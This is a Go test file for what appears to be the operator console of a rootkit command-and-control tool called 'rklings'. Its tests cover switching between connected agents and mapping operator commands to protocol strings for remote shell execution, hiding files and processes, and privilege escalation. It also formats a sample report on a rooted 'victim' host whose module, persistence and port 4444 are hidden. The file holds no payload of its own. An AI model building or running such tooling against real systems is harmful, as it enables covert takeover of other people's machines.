package main

import (
	"bufio"
	"net"
	"slices"
	"strings"
	"testing"
)

func TestRegistryKeepsMultipleAgentsAndSwitchesTarget(t *testing.T) {
	registry := agentRegistry{byID: make(map[string]*agentSession)}
	leftA, rightA := net.Pipe()
	leftB, rightB := net.Pipe()
	t.Cleanup(func() {
		leftA.Close()
		rightA.Close()
		leftB.Close()
		rightB.Close()
	})

	registry.add("alpha", leftA, bufio.NewReader(leftA))
	registry.add("bravo", leftB, bufio.NewReader(leftB))
	sessions, active, connections := registry.snapshot()
	if len(sessions) != 2 || active != "alpha" || connections != 2 {
		t.Fatalf("snapshot = %d sessions, active %q, %d connections", len(sessions), active, connections)
	}
	if err := registry.selectAgent("bravo"); err != nil {
		t.Fatal(err)
	}
	current, err := registry.current()
	if err != nil || current.id != "bravo" {
		t.Fatalf("current = %#v, %v", current, err)
	}
	if err := registry.selectAgent("missing"); err == nil {
		t.Fatal("selecting an unknown agent succeeded")
	}
}

func TestSuggestionsIncludeConnectedAgentIDs(t *testing.T) {
	suggestions := suggestionsFor([]*agentSession{{id: "rklings-765f62ee"}})
	if !slices.Contains(suggestions, "use rklings-765f62ee") {
		t.Fatalf("suggestions do not contain connected agent: %v", suggestions)
	}
}

func TestCommonPrefix(t *testing.T) {
	if got := commonPrefix([]string{"use alpha", "use alpine"}); got != "use alp" {
		t.Fatalf("commonPrefix = %q", got)
	}
}

func TestTabCompletesSingleAgent(t *testing.T) {
	agents.Lock()
	previous := agents.byID
	agents.byID = map[string]*agentSession{
		"rklings-765f62ee": {id: "rklings-765f62ee"},
	}
	agents.Unlock()
	t.Cleanup(func() {
		agents.Lock()
		agents.byID = previous
		agents.Unlock()
	})

	model := newConsole()
	model.input.SetValue("use rk")
	model.complete()
	if got := model.input.Value(); got != "use rklings-765f62ee" {
		t.Fatalf("completion = %q", got)
	}
}

func TestRegistryDisconnectSelectsRemainingAgent(t *testing.T) {
	registry := agentRegistry{byID: make(map[string]*agentSession)}
	leftA, rightA := net.Pipe()
	leftB, rightB := net.Pipe()
	t.Cleanup(func() {
		leftA.Close()
		rightA.Close()
		leftB.Close()
		rightB.Close()
	})
	registry.add("alpha", leftA, bufio.NewReader(leftA))
	registry.add("bravo", leftB, bufio.NewReader(leftB))

	if removed := registry.remove(leftA); removed != "alpha" {
		t.Fatalf("removed %q", removed)
	}
	current, err := registry.current()
	if err != nil || current.id != "bravo" {
		t.Fatalf("current = %#v, %v", current, err)
	}
}

func TestProtocolCommand(t *testing.T) {
	tests := []struct {
		name, arg, want string
	}{
		{"ping", "", "PING"},
		{"exec", "id -u", "SHELL id -u"},
		{"hide", "file secret", "HIDE FILE secret"},
		{"unhide", "pid 2", "UNHIDE PID 2"},
		{"escalate", "42", "ESCALATE 42"},
	}
	for _, test := range tests {
		got, err := protocolCommand(test.name, test.arg)
		if err != nil || got != test.want {
			t.Errorf("protocolCommand(%q, %q) = %q, %v; want %q", test.name, test.arg, got, err, test.want)
		}
	}
}

func TestFormatInfoProducesReadableSummary(t *testing.T) {
	result := formatResult(commandResult{
		command: "INFO",
		output:  `INFO {"hostname":"victim","kernel":"7.0.0","arch":"amd64","pid":900,"uid":0,"module_hidden":true,"persisted":true,"hidden":{"file":["rklings"],"port":["4444"]}}`,
	})
	for _, want := range []string{"victim", "7.0.0", "pid=900", "persistence", "file", "4444"} {
		if !strings.Contains(result, want) {
			t.Errorf("formatted INFO does not contain %q: %q", want, result)
		}
	}
	if strings.Contains(result, `{"hostname"`) {
		t.Fatalf("formatted INFO contains raw JSON: %q", result)
	}
}

func TestFormatShellResultPreservesStreamsAndExitCode(t *testing.T) {
	got, err := formatShellResult(`{"stdout":"out\n","stderr":"warn\n","exit_code":7}`)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"stdout:\nout", "stderr:\nwarn", "exit: 7"} {
		if !strings.Contains(got, want) {
			t.Errorf("formatted shell result does not contain %q: %q", want, got)
		}
	}
}
